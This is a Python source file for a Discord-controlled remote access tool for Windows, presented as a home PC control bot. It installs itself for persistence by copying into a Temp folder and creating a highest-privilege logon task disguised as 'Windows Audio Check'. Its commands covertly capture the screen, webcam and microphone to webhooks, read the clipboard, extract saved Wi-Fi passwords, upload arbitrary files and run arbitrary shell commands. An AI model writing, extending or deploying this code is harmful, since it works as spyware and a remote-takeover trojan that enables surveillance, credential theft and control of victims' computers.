import os
import io
import sys
import time
import re
import ctypes
import shutil
import paramiko
import subprocess
import requests
import cv2
import psutil
import pyautogui
import pyperclip
import pyttsx3
import discord
from discord.ext import commands
from PIL import ImageGrab
import scipy.io.wavfile as wav
import sounddevice as sd

TASK_NAME = "Windows Audio Check"
def is_authorized():
    async def predicate(ctx):
        return ctx.author.id == ALLOWED_USER_ID
    return commands.check(predicate)
def ensure_dependencies():
    required_packages = [
        "discord.py",
        "requests",
        "pillow",
        "psutil",
        "pyautogui",
        "pyperclip",
        "pyttsx3",
        "opencv-python",
        "sounddevice",
        "scipy"
    ]
    for package in required_packages:
        try:
            __import__(package.replace("-", "_"))
        except ImportError:
            print(f"Installing missing package: {package}...")
            subprocess.run([sys.executable, "-m", "pip", "install", package], check=True)

def setup_task_scheduler():
    if os.name != "nt":
        print("nah windows only ngl")
        return

    temp_dir = os.environ.get("TEMP", os.path.expanduser("~\\AppData\\Local\\Temp"))
    target_dir = os.path.join(temp_dir, "disappdata")
    
    if not os.path.exists(target_dir):
        os.makedirs(target_dir, exist_ok=True)

    if getattr(sys, 'frozen', False):
        current_file_path = sys.executable
        target_script_path = os.path.join(target_dir, "bot.exe")
    else:
        current_file_path = os.path.abspath(__file__)
        target_script_path = os.path.join(target_dir, "windowsclient.py")

    if os.path.normpath(current_file_path).lower() != os.path.normpath(target_script_path).lower():
        try:
            shutil.copy2(current_file_path, target_script_path)
            print(f"holy shit it actually copied to: {target_script_path}")
        except Exception as e:
            print(f"bruh copying failed: {e}")

    task_action = f'"{target_script_path}"'

    create_cmd = [
        "schtasks", "/create",
        "/tn", TASK_NAME,
        "/tr", task_action,
        "/sc", "onlogon",
        "/rl", "HIGHEST",
        "/f"
    ]

    result = subprocess.run(create_cmd, capture_output=True, text=True)

    if result.returncode == 0:
        print("hell yeah task scheduler entry created successfully.")
    else:
        print(f"oof task creation failed: {result.stderr.strip()}")
setup_task_scheduler()

BOT_TOKEN = "TOKEN"
ALLOWED_USER_ID = 1234567890
NOTIFICATION_CHANNEL_ID = 1234567890
SSH_DIR = os.path.expanduser("~/.ssh")
PUB_KEY_PATH = os.path.join(SSH_DIR, "id_ed25519.pub")
PRIV_KEY_PATH = os.path.join(SSH_DIR, "id_ed25519")
CAM_SCREENSHOT_WEBHOOK = "WEBHOOK"
MIC_WEBHOOK = "WEBHOOK"

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

def is_authorized(ctx: commands.Context) -> bool:
    return ctx.author.id == ALLOWED_USER_ID

def send_to_webhook(webhook_url: str, file_bytes: io.BytesIO, filename: str, content_msg: str = ""):
    files = {"file": (filename, file_bytes.getvalue())}
    payload = {"content": content_msg}
    response = requests.post(webhook_url, data=payload, files=files)
    return response.status_code in [200, 204]

@bot.event
async def on_ready():
    print("=" * 40)
    print(f"Logged in as: {bot.user.name}")
    print("Home PC Remote Control Bot is running!")
    print("=" * 40)
    
    channel = bot.get_channel(NOTIFICATION_CHANNEL_ID)
    if channel:
        await channel.send(" **System Boot Notice:** Home PC has started up and the control bot is online!")


@bot.command(name="ssh")
async def show_key(ctx):
    if not is_authorized(ctx):
        return await ctx.send(" Unauthorized access denied.")

    if os.path.exists(PUB_KEY_PATH):
        with open(PUB_KEY_PATH, "r") as f:
            pub_key = f.read().strip()
        await ctx.send(f"**Public SSH Key (`id_ed25519.pub`):**\n```\n{pub_key}\n```")
    else:
        await ctx.send(" No public SSH key found. Use `!resetssh` to generate a new pair.")

@bot.command(name="resetssh")
async def reset_key(ctx, passphrase: str = ""):
    if not is_authorized(ctx):
        return await ctx.send(" Unauthorized access denied.")

    try:
        for key_path in [PUB_KEY_PATH, PRIV_KEY_PATH]:
            if os.path.exists(key_path):
                os.remove(key_path)
        os.makedirs(SSH_DIR, mode=0o700, exist_ok=True)
        subprocess.run(
            ["ssh-keygen", "-t", "ed25519", "-f", PRIV_KEY_PATH, "-N", passphrase],
            check=True
        )

        with open(PUB_KEY_PATH, "r") as f:
            new_pub_key = f.read().strip()

        passphrase_notice = "with a passphrase" if passphrase else "without a passphrase"
        await ctx.send(
            f" **SSH key pair reset successfully ({passphrase_notice})!**\n\n"
            f"**New Public Key:**\n```\n{new_pub_key}\n```"
        )
    except Exception as e:
        await ctx.send(f" Failed to reset SSH key: `{e}`")

@bot.command(name="ping")
async def ping(ctx):
    if not is_authorized(ctx):
        return await ctx.send(" Unauthorized: You are not permitted to run commands on this PC.")
    await ctx.send(" Pong! Home PC is online and ready for commands.")

@bot.command(name="msgbox")
async def show_message_box(ctx, *, text: str):
    if not is_authorized(ctx):
        return await ctx.send(" Unauthorized access denied.")

    parts = text.split("|", 1)
    title = parts[0] if len(parts) > 1 else "Bot Notice"
    message = parts[1] if len(parts) > 1 else parts[0]

    ctypes.windll.user32.MessageBoxW(0, message, title, 0x40)
    await ctx.send(f" Displayed popup on screen: **{title}**")

@bot.command(name="status")
async def check_status(ctx):
    if not is_authorized(ctx):
        return
    
    cpu_usage = psutil.cpu_percent(interval=1)
    ram = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    
    embed = discord.Embed(title=" System Telemetry", color=0x3498db)
    embed.add_field(name="CPU Usage", value=f"`{cpu_usage}%`", inline=True)
    embed.add_field(name="RAM Usage", value=f"`{ram.percent}%` ({ram.used // (1024**2)} MB / {ram.total // (1024**2)} MB)", inline=False)
    embed.add_field(name="Disk Space", value=f"`{disk.percent}%` used ({disk.free // (1024**3)} GB free)", inline=False)
    
    await ctx.send(embed=embed)

@bot.command(name="stopbot")
async def stop_bot(ctx):
    if not is_authorized(ctx):
        return
    await ctx.send(" Logging out and shutting down bot process...")
    await bot.close()

@bot.command(name="press")
async def press_key(ctx, key: str):
    if not is_authorized(ctx):
        return
    
    try:
        pyautogui.press(key)
        await ctx.send(f" Pressed `{key}` key.")
    except Exception as e:
        await ctx.send(f" Error: `{e}`")

@bot.command(name="hotkey")
async def press_hotkey(ctx, *keys):
    if not is_authorized(ctx):
        return

    try:
        pyautogui.hotkey(*keys)
        await ctx.send(f" Executed shortcut: `{' + '.join(keys)}`")
    except Exception as e:
        await ctx.send(f" Error: `{e}`")

@bot.command(name="fetch")
async def fetch_file(ctx, *, filepath: str):
    if not is_authorized(ctx):
        return await ctx.send(" Unauthorized access denied.")

    filepath = filepath.strip('"\'')

    if not os.path.exists(filepath):
        return await ctx.send(" File not found at the specified path.")

    file_size_mb = os.path.getsize(filepath) / (1024 * 1024)
    if file_size_mb > 25:
        return await ctx.send(f" File is too large ({file_size_mb:.1f}MB). Discord max size is 25MB.")

    await ctx.send(f" Uploading `{os.path.basename(filepath)}`...")
    try:
        await ctx.send(file=discord.File(filepath))
    except Exception as e:
        await ctx.send(f" Upload error: `{e}`")

@bot.command(name="screenshot")
async def capture_screenshot(ctx):
    if not is_authorized(ctx):
        return await ctx.send(" Unauthorized access denied.")

    await ctx.send(" Capturing screen and sending to webhook...")

    try:
        screenshot = ImageGrab.grab()
        with io.BytesIO() as image_binary:
            screenshot.save(image_binary, "PNG")
            image_binary.seek(0)
            
            success = send_to_webhook(
                CAM_SCREENSHOT_WEBHOOK,
                image_binary,
                "desktop_screenshot.png",
                f" **Desktop Screenshot** requested by {ctx.author.mention}"
            )
            
        if success:
            await ctx.send(" Screenshot successfully delivered to your Webhook channel!")
        else:
            await ctx.send(" Failed to deliver screenshot to webhook.")
    except Exception as e:
        await ctx.send(f" Screenshot error: `{e}`")

@bot.command(name="cam")
async def capture_webcam(ctx):
    if not is_authorized(ctx):
        return await ctx.send(" Unauthorized access denied.")

    await ctx.send(" Capturing webcam photo and sending to webhook...")

    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            return await ctx.send(" Error: Could not access webcam.")

        ret, frame = cap.read()
        cap.release()

        if not ret or frame is None:
            return await ctx.send(" Error: Failed to capture webcam image.")

        is_success, buffer = cv2.imencode(".png", frame)
        if not is_success:
            return await ctx.send(" Error: Failed to encode image.")

        with io.BytesIO(buffer) as image_binary:
            image_binary.seek(0)
            success = send_to_webhook(
                CAM_SCREENSHOT_WEBHOOK,
                image_binary,
                "webcam_capture.png",
                f" **Webcam Photo** requested by {ctx.author.mention}"
            )

        if success:
            await ctx.send(" Webcam photo successfully delivered to your Webhook channel!")
        else:
            await ctx.send(" Failed to deliver webcam photo to webhook.")
    except Exception as e:
        await ctx.send(f" Webcam error: `{e}`")

@bot.command(name="mic")
async def record_audio(ctx, seconds: int = 10):
    if not is_authorized(ctx):
        return await ctx.send(" Unauthorized access denied.")

    seconds = min(max(seconds, 1), 30)
    await ctx.send(f" Recording microphone for **{seconds} seconds**...")

    try:
        sample_rate = 44100
        recording = sd.rec(
            int(seconds * sample_rate),
            samplerate=sample_rate,
            channels=1,
            dtype="int16"
        )
        sd.wait()

        audio_bytes = io.BytesIO()
        wav.write(audio_bytes, sample_rate, recording)
        audio_bytes.seek(0)

        success = send_to_webhook(
            MIC_WEBHOOK,
            audio_bytes,
            f"mic_recording_{seconds}s.wav",
            f" **Microphone Audio ({seconds}s)** requested by {ctx.author.mention}"
        )

        if success:
            await ctx.send(" Audio clip successfully delivered to your Mic Webhook channel!")
        else:
            await ctx.send(" Failed to deliver audio clip to webhook.")
    except Exception as e:
        await ctx.send(f" Microphone error: `{e}`")

@bot.command(name="clipboard")
async def get_clipboard(ctx):
    if not is_authorized(ctx):
        return await ctx.send(" Unauthorized access denied.")

    try:
        content = pyperclip.paste()
        if not content or content.strip() == "":
            await ctx.send(" Clipboard is empty or contains non-text content.")
        else:
            if len(content) > 1900:
                content = content[:1900] + "\n...[Truncated]"
            await ctx.send(f" **Current Clipboard Content:**\n```text\n{content}\n```")
    except Exception as e:
        await ctx.send(f" Error reading clipboard: `{e}`")

@bot.command(name="say")
async def text_to_speech(ctx, *, message: str):
    if not is_authorized(ctx):
        return await ctx.send(" Unauthorized access denied.")

    await ctx.send(f" Speaking on PC: *\"{message}\"*")
    try:
        engine = pyttsx3.init()
        engine.say(message)
        engine.runAndWait()
    except Exception as e:
        await ctx.send(f" TTS Error: `{e}`")

@bot.command(name="lock")
async def lock_pc(ctx):
    if not is_authorized(ctx):
        return await ctx.send(" Unauthorized access denied.")

    try:
        ctypes.windll.user32.LockWorkStation()
        await ctx.send(" Windows Workstation has been locked.")
    except Exception as e:
        await ctx.send(f" Lock Error: `{e}`")

@bot.command(name="wifi")
async def get_wifi_passwords(ctx):
    if not is_authorized(ctx):
        return await ctx.send(" Unauthorized access denied.")

    await ctx.send(" Extracting saved Wi-Fi profiles and security keys...")

    try:
        profiles_data = subprocess.check_output(
            ["netsh", "wlan", "show", "profiles"], text=True, errors="ignore"
        )
        profile_names = re.findall(r"All User Profile\s*:\s*(.*)", profiles_data)
        
        if not profile_names:
            return await ctx.send(" No saved Wi-Fi profiles found.")

        wifi_list = []
        for name in profile_names:
            name = name.strip()
            try:
                profile_info = subprocess.check_output(
                    ["netsh", "wlan", "show", "profile", name, "key=clear"],
                    text=True,
                    errors="ignore"
                )
                key_match = re.search(r"Key Content\s*:\s*(.*)", profile_info)
                password = key_match.group(1).strip() if key_match else "[Open Network / No Password Saved]"
                wifi_list.append(f"SSID: {name:<25} | Password: {password}")
            except Exception:
                wifi_list.append(f"SSID: {name:<25} | Password: [Failed to extract]")

        result_text = "\n".join(wifi_list)
        if len(result_text) > 1900:
            result_text = result_text[:1900] + "\n...[Output truncated]"

        await ctx.send(f"** Saved Wi-Fi Networks & Passwords:**\n```text\n{result_text}\n```")

    except Exception as e:
        await ctx.send(f" Wi-Fi extraction error: `{e}`")

@bot.command(name="kill")
async def kill_process(ctx, process_name: str):
    if not is_authorized(ctx):
        return
    
    if not process_name.endswith(".exe"):
        process_name += ".exe"
        
    os.system(f"taskkill /IM {process_name} /F")
    await ctx.send(f" Terminated process `{process_name}`.")

@bot.command(name="cmd")
async def run_command(ctx, *, command: str):
    if not is_authorized(ctx):
        return await ctx.send(" Unauthorized access denied.")

    await ctx.send(f" Executing: `{command}`...")

    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )

        output = result.stdout or result.stderr or "Command executed successfully with no output."
        MAX_LEN = 1900
        
        if len(output) <= MAX_LEN:
            await ctx.send(f"```text\n{output}\n```")
        else:
            await ctx.send(" **Output is large. Splitting into multiple messages:**")
            chunks = [output[i:i + MAX_LEN] for i in range(0, len(output), MAX_LEN)]
            
            for index, chunk in enumerate(chunks[:5]):
                await ctx.send(f"```text\n[Part {index + 1}/{len(chunks)}]\n{chunk}\n```")
                
            if len(chunks) > 5:
                await ctx.send("... [Output truncated: too many total characters]")

    except subprocess.TimeoutExpired:
        await ctx.send(" Command timed out after 30 seconds.")
    except Exception as e:
        await ctx.send(f" Error executing command: `{e}`")

@bot.command(name="shutdown")
async def shutdown_pc(ctx):
    if not is_authorized(ctx):
        return await ctx.send(" Unauthorized access denied.")

    await ctx.send(" Shutting down Home PC in 10 seconds... Use `!cmd shutdown /a` to abort.")
    os.system("shutdown /s /t 10")

def wait_for_internet(timeout=60):
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            requests.get("https://discord.com", timeout=3)
            return True
        except requests.RequestException:
            time.sleep(3)
    return False

if __name__ == "__main__":
        print("Checking network connectivity...")
        if wait_for_internet():
            print("Internet connected. Starting bot...")
            bot.run(BOT_TOKEN)
        else:
            print("Network timed out. Exiting.")
